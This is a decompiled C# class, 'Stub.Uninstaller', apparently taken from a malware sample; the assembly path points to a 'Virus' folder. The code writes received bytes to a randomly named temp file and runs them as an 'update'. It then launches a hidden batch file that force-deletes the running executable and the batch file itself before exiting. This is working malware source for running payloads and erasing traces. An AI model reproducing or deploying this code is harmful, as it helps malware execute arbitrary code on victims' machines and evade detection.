// Decompiled with JetBrains decompiler
// Type: Stub.Uninstaller
// Assembly: DesignV3Sv, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7FCAC0DD-9A5C-4DA4-BFB3-EE6355E60533
// Assembly location: C:\Users\hadesker\Desktop\Virus\DesignV\DesignV3Sv.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

#nullable disable
namespace Stub
{
  public class Uninstaller
  {
    public static void UNS(bool IsUpdate, string Str, byte[] B)
    {
      if (IsUpdate)
      {
        try
        {
          Str = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + Str);
          File.WriteAllBytes(Str, B);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        string path = Path.GetTempFileName() + ".bat";
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine("@echo off");
          streamWriter.WriteLine("timeout 3 > NUL");
          streamWriter.WriteLine("CD " + Application.StartupPath);
          streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.ExecutablePath) + "\" /f /q");
          streamWriter.WriteLine("CD " + Path.GetTempPath());
          streamWriter.WriteLine("DEL \"" + Path.GetFileName(path) + "\" /f /q");
        }
        if (IsUpdate)
        {
          try
          {
            Process.Start(Str);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        Process.Start(new ProcessStartInfo()
        {
          FileName = path,
          CreateNoWindow = true,
          ErrorDialog = false,
          UseShellExecute = false,
          WindowStyle = ProcessWindowStyle.Hidden
        });
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
